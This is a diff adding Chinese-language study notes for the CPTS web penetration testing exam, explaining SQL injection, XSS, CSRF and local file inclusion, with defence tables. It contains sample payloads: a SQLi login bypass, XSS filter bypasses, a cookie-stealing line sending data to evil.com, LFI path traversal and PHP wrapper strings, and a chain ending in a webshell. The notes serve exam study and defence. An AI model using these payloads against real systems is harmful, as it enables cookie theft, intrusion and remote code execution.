@@ -1,0 +1,113 @@
+<p>CPTS / Web Pentesting 必備基礎。建立 HTML、CSS、JavaScript 與四大漏洞（SQLi、XSS、CSRF、LFI）之間的關聯。</p>
+
+<h4>漏洞關聯總覽</h4>
+<table>
+    <tr><th>漏洞</th><th>主要關聯技術</th><th>攻擊位置</th><th>核心原因</th></tr>
+    <tr><td>SQLi</td><td>HTML (表單) → 後端 SQL</td><td>伺服器端</td><td>使用者輸入直接拼進 SQL 語句</td></tr>
+    <tr><td>XSS</td><td>HTML + JavaScript</td><td>客戶端</td><td>使用者輸入被當作 HTML/JS 執行</td></tr>
+    <tr><td>CSRF</td><td>HTML (表單/img) + Cookie</td><td>客戶端 → 伺服器</td><td>瀏覽器自動帶 Cookie，伺服器沒驗證來源</td></tr>
+    <tr><td>LFI</td><td>HTML (連結/參數) → 後端檔案</td><td>伺服器端</td><td>使用者輸入被當作檔案路徑</td></tr>
+</table>
+
+<h4>HTTP 請求生命週期</h4>
+<pre><code>使用者在瀏覽器操作（填表單、點連結）
+    ↓
+瀏覽器組裝 HTTP Request
+    ├── URL / Method / Headers / Body
+    ↓
+後端程式處理
+    ├── 查詢資料庫 → SQL 語句     ← SQLi 發生處
+    ├── 讀取檔案 → 檔案路徑        ← LFI 發生處
+    └── 組裝回應 HTML              ← XSS 發生處（反射型）
+    ↓
+瀏覽器渲染頁面
+    └── 執行 JS → DOM-based XSS 發生處</code></pre>
+
+<h4>SQL Injection (SQLi)</h4>
+<p>後端把使用者輸入<strong>直接拼接</strong>進 SQL 語句：</p>
+<pre><code>-- 使用者輸入：admin' OR 1=1--
+-- 實際執行：
+SELECT * FROM users WHERE username = 'admin' OR 1=1--'
+-- OR 1=1 永遠為真 → 回傳所有使用者</code></pre>
+
+<table>
+    <tr><th>類型</th><th>特徵</th><th>資料取得方式</th></tr>
+    <tr><td>Union-based</td><td>頁面顯示查詢結果</td><td>UNION SELECT</td></tr>
+    <tr><td>Error-based</td><td>頁面顯示錯誤訊息</td><td>利用 SQL 錯誤洩漏</td></tr>
+    <tr><td>Boolean Blind</td><td>兩種狀態</td><td>逐 bit 推斷</td></tr>
+    <tr><td>Time-based Blind</td><td>完全沒回饋</td><td>SLEEP() 觀察回應時間</td></tr>
+</table>
+
+<h4>Cross-Site Scripting (XSS)</h4>
+<p>使用者輸入被原封不動嵌入 HTML，瀏覽器當作合法 JS 執行。</p>
+<p><strong>三種類型：</strong></p>
+<ul>
+    <li><em>Reflected</em> — payload 在 URL，伺服器反射回 HTML</li>
+    <li><em>Stored</em> — payload 存進資料庫，其他使用者瀏覽時觸發</li>
+    <li><em>DOM-based</em> — 完全在前端處理，不經過伺服器</li>
+</ul>
+<pre><code>&lt;!-- 基本 --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+&lt;!-- 繞過 &lt;script&gt; 過濾 --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+&lt;!-- 竊取 Cookie --&gt;
+&lt;img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"&gt;</code></pre>
+
+<h4>CSRF vs XSS 的關鍵區別</h4>
+<table>
+    <tr><th>比較</th><th>CSRF</th><th>XSS</th></tr>
+    <tr><td>攻擊位置</td><td>攻擊者自己的網站</td><td>目標網站</td></tr>
+    <tr><td>需要 JS？</td><td>不一定</td><td>幾乎都要</td></tr>
+    <tr><td>能讀回應？</td><td>❌ 不能（同源政策）</td><td>✅ 可以</td></tr>
+</table>
+<blockquote><strong>🔑</strong> XSS 是 CSRF 的超集：有 XSS 就能做 CSRF 能做的一切</blockquote>
+
+<h4>Local File Inclusion (LFI)</h4>
+<pre><code># 基本目錄穿越
+?file=../../../../etc/passwd
+
+# PHP Wrapper（必考！）
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://input     # POST body 當 PHP 執行
+
+# Log Poisoning → RCE
+# 1. User-Agent 注入 PHP code
+# 2. LFI 包含日誌
+?file=../../../../var/log/apache2/access.log&amp;cmd=id</code></pre>
+
+<h4>LFI → RCE 路徑</h4>
+<pre><code>LFI（讀取檔案）
+├── 讀 /etc/passwd → 列舉使用者
+├── 讀原始碼（php://filter）→ 找更多漏洞
+├── Log Poisoning → 包含日誌 = RCE
+├── PHP Session 中毒 → 包含 session 檔案 = RCE
+└── PHP Wrappers → php://input / data:// → 直接 RCE</code></pre>
+
+<h4>漏洞串聯攻擊鏈</h4>
+<pre><code>1. 發現 LFI → 讀取 PHP 原始碼
+2. 原始碼中找到 SQLi 注入點 + DB 密碼
+3. SQLi 取得 admin 帳密 → 登入後台
+4. 後台有 Stored XSS → 植入 JS 後門
+5. JS 後門持續竊取其他管理員的 session
+6. 利用 admin 權限上傳 webshell → RCE</code></pre>
+
+<h4>防禦速查表</h4>
+<table>
+    <tr><th>漏洞</th><th>防禦方式</th></tr>
+    <tr><td>SQLi</td><td>Prepared Statement、ORM、最小 DB 權限、WAF</td></tr>
+    <tr><td>XSS</td><td>輸出編碼、CSP、HttpOnly cookie、輸入驗證</td></tr>
+    <tr><td>CSRF</td><td>Anti-CSRF token、SameSite cookie、檢查 Referer</td></tr>
+    <tr><td>LFI</td><td>白名單路徑、禁用 allow_url_include、容器隔離</td></tr>
+</table>
+
+<h4>CPTS 考試重點</h4>
+<ul>
+    <li><strong>SQLi</strong>：一定要會手動注入，理解 UNION 注入的欄位數判斷流程</li>
+    <li><strong>XSS</strong>：Stored XSS 在實戰中比 Reflected 更危險</li>
+    <li><strong>CSRF</strong>：檢查 SameSite 屬性、token 驗證邏輯</li>
+    <li><strong>LFI</strong>：PHP Wrapper 是必考 — <code>php://filter</code> 讀原始碼、<code>php://input</code> 拿 RCE</li>
+    <li><strong>串聯</strong>：考試偏好多步驟攻擊鏈，要習慣從一個漏洞跳到下一個</li>
+</ul>
